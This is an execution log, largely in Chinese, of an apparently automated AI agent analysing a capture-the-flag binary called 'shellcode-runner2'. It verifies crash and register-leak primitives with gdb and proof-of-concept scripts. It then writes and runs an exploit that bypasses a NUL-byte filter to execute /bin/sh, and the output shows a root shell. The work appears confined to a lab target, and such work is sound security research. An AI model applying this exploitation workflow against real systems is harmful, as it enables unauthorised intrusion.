14:03:09 [impact:BUG-002] ← GLM(22.3s): 调工具[gdb_run]
14:03:09 [impact:BUG-002] 太棒了！非常重要的发现：  **PRIM-002 (OOB 写入测试)**： - GDB 在 `0x1336F000` 映射了一个页面，覆盖了 `0x1336FFFE` - 在 `0x1336FFFE` 处设置了字节 `0x0a` (换行符) - 设置 `read_ret = -1` - 在 `0x
14:03:09 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "commands": "b *0x4019b2; run; print/x $eax; print *(int*)($rbp-0x)
14:03:09 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x4019b2 ⏎  ⏎ Input your shellcode here (max: 100):  ⏎ Breakpoint 1, 0x00000000004019b2 in main () ⏎ $1 = 0x1 ⏎ $2 = 0 ⏎ rax          ...(777 chars)
14:03:09 [impact:BUG-002] → 调用 GLM...
14:03:38 [impact:BUG-002] ← GLM(29.2s): 调工具[write_file]
14:03:38 [impact:BUG-002] 在正常输入（"A"）的情况下，`read()` 返回 1（读取了 1 个字节），程序继续执行 shellcode 并在 `0x13370000` 处崩溃（因为 "A" 不是有效的指令）。这确认了正常路径。  现在，让我使用 GDB 来验证非阻塞情况，以确认 `read()` 是否返回 -1。我将使用
14:03:38 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: Final comprehensive verification.\n\nPRIM-001: CRASH via OOB read at unmapped 0x1336FFFE\n  - Tr)
14:03:38 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-002.py
14:03:38 [impact:BUG-002] → 调用 GLM...
14:03:41 [impact:BUG-002] ← GLM(2.8s): 调工具[run_script]
14:03:41 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-002.py", "timeout": 30})
14:03:41 [impact:BUG-002]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ============================================================ ⏎ BUG-002: READ_RETURN_VALUE_INSUFFICIENT_CHECK ⏎ Pr...(2840 chars)
14:03:41 [impact:BUG-002] → 调用 GLM...
14:05:04 [impact:BUG-002] ← GLM(82.8s): 调工具[submit_final_result]
14:05:04 [impact:BUG-002] 所有验证已完成。让我总结一下发现：  **PRIM-001 (CRASH): 已验证** - 触发条件：非阻塞 stdin → `read()` 返回 -1 (EAGAIN) - `read_ret = -1` 通过了 `!= 0` 的检查 - `buf[read_ret - 1] = buf[-2
14:05:04 [impact:BUG-002] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，17032 chars）
14:05:04 [impact:BUG-002] → 调用 GLM...
14:05:14 [impact:BUG-002] ← GLM(10.1s)
14:05:14 [impact:BUG-002] BUG-002 的 S3 分析已完成。以下是发现摘要：  ## BUG-002: READ_RETURN_VALUE_INSUFFICIENT_CHECK  ### 分析原语 (Primitives)  **PRIM-001: CRASH (已验证)** - **触发条件**: 非阻塞 stdin 
14:05:14 === impact (bug_id=BUG-003) ===
14:05:14 [impact:BUG-003] → 调用 GLM...
14:05:18 [impact:BUG-003] ← GLM(3.4s): 调工具[disassemble, read_file]
14:05:18 [impact:BUG-003] 我将分析 BUG-003（shellcode 执行前的寄存器状态信息泄露）。让我先了解二进制文件和漏洞细节。
14:05:18 [impact:BUG-003]   → 工具 disassemble({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "function": "main", "lines": 200})
14:05:18 [impact:BUG-003]   → 工具 read_file({"file_path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "limit": 1})
14:05:18 [impact:BUG-003]   ← read_file(0.0s): Error: Error reading file '/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target': 'utf-8' codec can't decode byte 0xb8 in position 40...(170 chars)
14:05:18 [impact:BUG-003]   ← disassemble(0.1s): 00000000004018dd <main>: ⏎   4018dd:	endbr64 ⏎   4018e1:	push   rbp ⏎   4018e2:	mov    rbp,rsp ⏎   4018e5:	push   r15 ⏎   4018e7:	push   r14 ⏎   4018e...(5837 chars)
14:05:18 [impact:BUG-003] → 调用 GLM...
14:05:21 [impact:BUG-003] ← GLM(3.2s): 调工具[gdb_run, probe_io]
14:05:21 [impact:BUG-003] 现在让我查看 0x498070 处的格式字符串，以准确了解打印了哪些寄存器，并探测 I/O 以了解运行时行为。
14:05:21 [impact:BUG-003]   → 工具 gdb_run({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "commands": "x/s 0x498070", "stdin": ""})
14:05:21 [impact:BUG-003]   → 工具 probe_io({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "input": "AAAA", "max_lines": 60})
14:05:21 [impact:BUG-003]   ← probe_io(0.0s): 00000000: 0a49 6e70 7574 2079 6f75 7220 7368 656c  .Input your shel ⏎ 00000010: 6c63 6f64 6520 6865 7265 2028 6d61 783a  lcode here (max: ⏎ 00000020: ...(1417 chars)
14:05:21 [impact:BUG-003]   ← gdb_run(0.0s): 0x498070:	"Before running the shellcode:\nrax = %p\nrbx = 0x%lx\nrcx = 0x%lx\nrdx = 0x%lx\nrbp = 0x%lx\nrsp = 0x%lx\nrsi = 0x%lx\nrdi = 0x%lx\nr8 = 0x...(226 chars)
14:05:21 [impact:BUG-003] → 调用 GLM...
14:05:26 [impact:BUG-003] ← GLM(4.7s): 调工具[run_binary, run_binary]
14:05:26 [impact:BUG-003] 太好了！这证实了信息泄露。输出清楚地显示了所有寄存器值，包括： - `rax = 0x13370000` (mmap 缓冲区地址) - `rbx = 0x7ffd5fcd3c98` (libc 数据段地址) - `rbp = 0x7ffd5fcd3aa0` (栈地址) - `rsp = 0x7ffd
14:05:26 [impact:BUG-003]   → 工具 run_binary({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "stdin": "AAAA", "timeout": 5})
14:05:26 [impact:BUG-003]   → 工具 run_binary({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "stdin": "AAAA", "timeout": 5})
14:05:26 [impact:BUG-003]   ← run_binary(0.0s): rc=-11  stdout_len=307 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 00...(1576 chars)
14:05:26 [impact:BUG-003]   ← run_binary(0.0s): rc=-11  stdout_len=307 ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  0a 49 6e 70 75 74 20 79 6f 75 72 20 73 68 65 6c  |.Input your shel| ⏎ 00...(1576 chars)
14:05:26 [impact:BUG-003] → 调用 GLM...
14:05:32 [impact:BUG-003] ← GLM(6.5s): 调工具[gdb_run]
14:05:32 [impact:BUG-003] 这证实了 ASLR 已开启——栈地址在不同运行间发生了变化： - Run 1: `rbp = 0x7fff18f83a00`, `rsp = 0x7fff18f83950` - Run 2: `rbp = 0x7ffef6494c60`, `rsp = 0x7ffef6494bb0`  泄露的寄存器
14:05:32 [impact:BUG-003]   → 工具 gdb_run({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "commands": "b *0x401afb; run <<< \"AAAA\"; info registers rax rbx)
14:05:32 [impact:BUG-003]   ← gdb_run(0.0s): Breakpoint 1 at 0x401afb ⏎ rbx points to:  ⏎ /bin/sh: 1: Syntax error: redirection unexpected ⏎ During startup program exited with code 2. ⏎ The progr...(508 chars)
14:05:32 [impact:BUG-003] → 调用 GLM...
14:05:38 [impact:BUG-003] ← GLM(5.4s): 调工具[gdb_run]
14:05:38 [impact:BUG-003] `<<<` heredoc 在这里不起作用。让我使用正确的 stdin 参数。
14:05:38 [impact:BUG-003]   → 工具 gdb_run({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "commands": "b *0x401afb; run; info registers rax rbx rcx rdx rbp )
14:05:38 [impact:BUG-003]   ← gdb_run(0.1s): Breakpoint 1 at 0x401afb ⏎  ⏎ Input your shellcode here (max: 100):  ⏎ Breakpoint 1, 0x0000000000401afb in main () ⏎ rax            0x0               ...(1628 chars)
14:05:38 [impact:BUG-003] → 调用 GLM...
14:05:49 [impact:BUG-003] ← GLM(11.4s): 调工具[gdb_run]
14:05:49 [impact:BUG-003] 有趣！在 GDB 下，ASLR 被禁用（栈地址固定为 0x7fffffffe...）。但关键发现是：printf 输出显示了与 GDB 寄存器显示不同的寄存器值。这是因为代码在打印前对寄存器进行了重排。让我更仔细地分析一下打印的输出与实际寄存器值的对比。  查看 printf 输出： - `rax 
14:05:49 [impact:BUG-003]   → 工具 gdb_run({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "commands": "b *0x401afb; run; printf \"\\n=== Register state at p)
14:05:49 [impact:BUG-003]   ← gdb_run(0.1s): Breakpoint 1 at 0x401afb ⏎  ⏎ Input your shellcode here (max: 100):  ⏎ Breakpoint 1, 0x0000000000401afb in main () ⏎  ⏎ === Register state at printf c...(1348 chars)
14:05:49 [impact:BUG-003] → 调用 GLM...
14:06:01 [impact:BUG-003] ← GLM(11.9s): 调工具[gdb_run]
14:06:01 [impact:BUG-003] 现在我已经完全理解了寄存器泄露的情况。格式化字符串将寄存器映射到 printf 参数，如下所示： - `rax = %p` → rsi = 0x13370000 (mmap 缓冲区) - `rbx = 0x%lx` → stack[0] = 0x7fffffffe9f0 (栈指针！) - `rcx 
14:06:01 [impact:BUG-003]   → 工具 gdb_run({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "commands": "b *0x401afb; run; printf \"\\n=== Printf arg mapping )
14:06:01 [impact:BUG-003]   ← gdb_run(0.1s): Breakpoint 1 at 0x401afb ⏎  ⏎ Input your shellcode here (max: 100):  ⏎ Breakpoint 1, 0x0000000000401afb in main () ⏎  ⏎ === Printf arg mapping === ⏎ r...(1141 chars)
14:06:01 [impact:BUG-003] → 调用 GLM...
14:06:34 [impact:BUG-003] ← GLM(32.6s): 调工具[write_file]
14:06:34 [impact:BUG-003] 现在我已经掌握了完整的情况。泄露的寄存器值为： - `rax = 0x13370000` - mmap 缓冲区地址（固定，无 ASLR） - `rbx = 0x7fffffffec98` - 栈地址（原始 rdx 值，指向栈上的 envp） - `rbp = 0x7fffffffeaa0` - 栈帧
14:06:34 [impact:BUG-003]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-003: REGISTER_STATE_INFORMATION_LEAK_BEFORE_SHELLCODE_EXECUTION\nPrimitive: INFO_LEAK\n\nThis PoC ver)
14:06:34 [impact:BUG-003]   ← write_file(0.0s): Updated file /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-003.py
14:06:34 [impact:BUG-003] → 调用 GLM...
14:06:37 [impact:BUG-003] ← GLM(3.6s): 调工具[run_script]
14:06:37 [impact:BUG-003]   → 工具 run_script({"path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/poc-BUG-003.py", "timeout": 30})
14:06:37 [impact:BUG-003]   ← run_script(0.0s): rc=0 ⏎ --- stdout (summarized) --- ⏎ BUG-003: REGISTER_STATE_INFORMATION_LEAK Verification ⏎ =========================================================...(2665 chars)
14:06:37 [impact:BUG-003] → 调用 GLM...
14:07:37 [impact:BUG-003] ← GLM(59.2s): 调工具[submit_final_result]
14:07:37 [impact:BUG-003] PoC 已验证 INFO_LEAK 原语。让我总结一下关键发现：  1. **已确认泄露**：在执行 shellcode 之前，通过 `_IO_printf` 将 14 个寄存器值打印到 stdout，地址为 0x401afb 2. **泄露的栈地址**：`rbp`、`rsp`、`r11`（均为栈指
14:07:37 [impact:BUG-003] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，11493 chars）
14:07:37 [impact:BUG-003] → 调用 GLM...
14:07:46 [impact:BUG-003] ← GLM(9.0s)
14:07:46 [impact:BUG-003] BUG-003 的 S3 分析已完成。以下是验证内容的摘要：  ## BUG-003: REGISTER_STATE_INFORMATION_LEAK — 已验证  **原语 (Primitive):** INFO_LEAK (直接)  **关键发现:** 1. 二进制文件在执行用户控制的 shel
14:07:46 [stage3] 保存 → /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/stage3.json
14:07:46 --- S4 Exploit ---
14:07:46 === exploit (bug_id=-) ===
14:07:46 [exploit] → 调用 GLM...
14:07:52 [exploit] ← GLM(6.2s): 调工具[probe_io, ls]
14:07:52 [exploit] 我将分析 S1/S2/S3 报告并规划 exploit 路线。核心发现：BUG-001 提供了通过 NUL 字节绕过过滤器的已验证 CODE_EXECUTION 原语，RWX mmap 区域位于固定地址 0x13370000，无 seccomp，CET/IBT 未强制执行。这是最直接且最稳定的路线—
14:07:52 [exploit]   → 工具 probe_io({"binary": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/target", "input": "AAAA"})
14:07:52 [exploit]   → 工具 ls({"path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900"})
14:07:52 [exploit]   ← probe_io(0.0s): 00000000: 0a49 6e70 7574 2079 6f75 7220 7368 656c  .Input your shel ⏎ 00000010: 6c63 6f64 6520 6865 7265 2028 6d61 783a  lcode here (max: ⏎ 00000020: ...(1417 chars)
14:07:52 [exploit]   ← ls(0.0s): ['/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/core.14520', '/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/core.145...(2477 chars)
14:07:52 [exploit] → 调用 GLM...
14:07:58 [exploit] ← GLM(5.7s): 调工具[execute]
14:07:58 [exploit] 二进制文件确认了其行为：打印寄存器转储，然后执行 shellcode。S3 PoC 已经验证了 NUL 字节绕过机制是有效的。现在让我清理核心文件并编写 exploit。  该路由很明确：BUG-001 提供了在固定地址 0x13370000 处的 RWX 区域内的直接 CODE_EXECUTION
14:07:58 [exploit]   → 工具 execute({"command": "rm -f /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/core.*"})
14:07:58 [exploit]   ← execute(0.0s): <no output> ⏎ [Command succeeded with exit code 0]
14:07:58 [exploit] → 调用 GLM...
14:08:40 [exploit] ← GLM(42.8s): 调工具[write_file]
14:08:40 [exploit] 现在让我来编写 exploit。关键的 payload 结构是： - 字节 0：`P` (0x50, PUSH rax — 允许集合，通过过滤器) - 字节 1：`0x00` (NUL — 终止 strlen，过滤器仅检查字节 0) - 字节 2：`0x00` (ModRM 用于 ADD [rax]
14:08:40 [exploit]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nS4 Exploit: Shellcode Runner 2 — NUL Byte Filter Bypass → execve(\"/bin/sh\")\n\nTarget: /work/workspace/)
14:08:40 [exploit]   ← write_file(0.0s): Updated file /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/exploit.py
14:08:40 [exploit] → 调用 GLM...
14:08:44 [exploit] ← GLM(3.1s): 调工具[run_script]
14:08:44 [exploit]   → 工具 run_script({"path": "/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/exploit.py", "timeout": 30})
14:08:48 [exploit]   ← run_script(4.2s): rc=0 ⏎ --- stdout (summarized) --- ⏎ --- key evidence --- ⏎     LEANAGENT_SUCCESS ⏎     uid=0(root) gid=0(root) groups=0(root) ⏎ LEANAGENT_SUCCESS ⏎ u...(951 chars)
14:08:48 [exploit] → 调用 GLM...
14:10:03 [exploit] ← GLM(75.0s): 调工具[submit_final_result]
14:10:03 [exploit] 漏洞利用在第一次尝试时就成功了。证据很明确： - `LEANAGENT_SUCCESS` — 我们的 echo 命令已执行 - `uid=0(root) gid=0(root) groups=0(root)` — 以 root 身份运行 shell - `test_flag_content_here
14:10:03 [exploit] ✓ submit_final_result 收到最终报告（ExploitReport 校验通过，12502 chars）
14:10:03 [exploit] → 调用 GLM...
14:10:11 [exploit] ← GLM(8.5s)
14:10:11 [exploit] 漏洞利用已成功提交。以下是所完成工作的总结：  ## S4 漏洞利用总结  **选定路线：** ROUTE-01 — NUL 字节过滤绕过 → 在 RWX mmap 中执行 execve("/bin/sh") shellcode  **漏洞利用：** BUG-001 (S3 PRIM-001, 已验
14:10:11 ✅ Exploit 成功（status=COMPLETED, result_status=EXPLOIT_SUCCESS）。
14:10:11 [stage4] 保存 → /work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/stage4.json
14:10:44 📄 渗透报告：/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/report.md
=== 主 agent 汇总 ===
分析完成！以下是结果摘要：

## 漏洞分析结果

| 项目 | 结果 |
|------|------|
| **目标二进制** | `/work/ctf2/0017-2022-30-shellcode-runner2/target` |
| **分析状态** | ✅ 成功完成 S1-S4 全流程 |
| **Exploit 是否成功** | ✅ 成功 |
| **Exploit 脚本路径** | `/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/exploit.py` |
| **完整报告路径** | `/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900/report.md` |
| **工作目录** | `/work/workspace/0017-2022-30-shellcode-runner2-20260908-134900` |

### 说明
- 该二进制是一个 **shellcode runner**（shellcode 执行器），S1-S4 四阶段分析全部顺利跑通。
- **Exploit 成功**：自动生成的 exploit 脚本已验证可成功利用该漏洞。
- 完整的 stage1-4 JSON、exploit 脚本、报告及运行日志均保存在上述 workspace 目录中，可随时查看。
